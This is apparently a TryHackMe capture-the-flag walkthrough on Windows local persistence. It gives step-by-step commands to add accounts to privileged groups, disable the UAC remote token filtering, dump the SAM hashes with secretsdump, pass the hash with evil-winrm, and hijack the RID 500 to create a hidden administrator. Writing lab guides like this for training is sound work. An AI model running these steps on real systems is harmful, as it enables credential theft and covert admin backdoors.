## Room : [Windows Local Persistence - Tampering with unprivileged accounts](https://tryhackme.com/room/windowslocalpersistence)

`net localgroups` can be used to add unprivileged accounts to Admininstrators / Backup Operators groups for higher privilege or access

Example:
```
net localgroup administrators thmuser0 /add
net localgroup "Backup Operators" thmuser1 /add
net localgroup "Remote Management Users" thmuser1 /add
```

- **Administrators** are master key groups
- **Backup Operators** are key users (for data only) who need to capture/read/write _everything / anything_ when backing up ignoring ACLs (_Access Control Lists_) even protected files like SAM (_Security Accounts Manager_) database and System Hives

### Assumptions
- we assume you have already gained administrative access somehow and are trying to establish persistence from there.
- we will assume you have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use
- we have already dumped the credentials on the server and have thmuser1's password. 

## Follow Me
1. We will RDP (credentials provided in room) or connect to the Machine (from browser) attached to the room
2. Open Command Prompt > Run the command: `net localgroup "Backup Operators" thmuser1 /add` - this will add `thmuser1` user to the Backup Operators group helping us ignore all the ACLs
3. Since `thmuser1` is an unprivileged account, we have to add it to the "Remote Management Users" group so that we can RDP or WinRM to the machine. Run the command: `net localgroup "Remote Management Users" thmuser1 /add`
4. Now lets connect to the machine. From attacker machine, run the command: `evil-winrm -i 10.81.179.227 -u thmuser1 -p Password321`
5. You will be using evil-winrm to connect as shown below:
![WLP1](/img/WLP1.png)
6. Now even if you do a `dir /A` you will see you cant run it due to the group "Backup Operators" being disabled.
![WLP2](/img/WLP2.png)
7. The reason being UAC (_User Account Control_) stripping all local account of its admin privileges when logged in remotely. Problem is WinRM, with limited access token, you have no admin privileges. The **UAC feature** that results in this power stripping is `LocalAccountTokenFilterPolicy`.
We will have to regain admin privileges by disabling the feature. Run the command on the attached machine with Admin privileges / RDP-ed with Admin:
`reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1`
![WLP3](/img/WLP3.png)
8. Now `exit` out of the previous session and get back in same way as step 4. You will see the group is not active.
![WLP4](/img/WLP4.png)
9. Now lets back up and download the SAM and SYSTEM files. Run Command as below:
![WLP5](/img/WLP5.png)
10. Lets dump the password hashes with the files we downloaded (for some system glitch, I had to move to the attackbox provided by THM). Run the command: 
`python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL`
![WLP6](/img/WLP6.png)
11. The admin hash (from the previous step) `f3118544--------80cfdb9c1fa`. Let's pass the hash to connect to the machine as admin. Run the command:
`evil-winrm -i 10.81.179.227 -u Administrator -H ff3118544--------80cfdb9c1fa`
12. As hinted on the room, we have to run the `flag1.exe` for our first flag.
![WLP7](/img/WLP7.png)
13. "Backup Operators" group has 2 privilege assigned by default - `SeBackupPrivilege` and `SeRestorePrivilege`. Let's assign such high privileges to ANY user, independent of their group memberships: (Run the command on the attached machine)
`secedit /export /cfg config.inf`
14. Edit the file in Notepad 
![WLP8](/img/WLP8.png)
![WL8-1](/img/WLP8-1.png)
15. Converting the inf file to sdb file. Let's load the config back. Run the code:
```
secedit /import /cfg config.ini /db config.db
secedit /configure /db config.db /cfg config.ini
```
16. New user with same privilege as Backup Operator is created but wont be able to log in via WinRM.
Now lets change the **Security Descriptor** (instead of adding to Remote login group). Run the code: `Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI`
![WLP9](/img/WLP9.png)
17. Lets change the permissions (see screenshot) to log in as `thmUser2`
![WLP9-1](/img/WLP9-1.png)
18. Now our user can connect via winRM with right permission and retrieve the `flag2.exe`
`evil-winrm -i 10.81.181.37 -u thmuser2 -p Password321`
![WLP10](/img/WLP10.png)
19. Lets get the assigned RIDs for users. Run the command (on the attached machine)
`wmic useraccount get name,sid`
![WLP11](/img/WLP11.png)
20. Last bit if the SID is RID. `500 for Administrator` We have to assign 500 to `thmUser3` by accessing the SAM using `regedit` - can only be done using `psexec` available in `C:\tools\pstools` in machine.
Note:  The SID is an identifier that allows the operating system to identify a user across a domain
![WLP12](/img/WLP12.png)
21. Now you can RDP using the user and password provided (not evil-winrm), and check the `flag3.exe`